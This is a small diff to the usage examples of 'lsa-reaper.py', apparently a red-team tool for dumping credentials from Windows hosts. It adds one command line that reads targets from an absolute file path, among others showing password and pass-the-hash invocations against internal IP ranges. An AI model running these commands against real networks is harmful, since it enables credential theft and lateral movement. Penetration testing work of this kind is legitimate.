@@ -62,6 +62,8 @@ sudo python3 lsa-reaper.py testdomain/testuser:'P@ssw0rd!'@10.0.0.10-200
 
 sudo python3 lsa-reaper.py testdomain/testuser:'P@ssw0rd!'@ipList.txt
 
+sudo python3 lsa-reaper.py testdomain/testuser:'P@ssw0rd!'@/absolute/path/to/file/ipList.txt
+
 sudo python3 lsa-reaper.py testdomain/testuser@10.0.0.100
 
 sudo python3 lsa-reaper.py -hashes 'LMHASH:NTHASH' testdomain/testuser@10.0.0.100
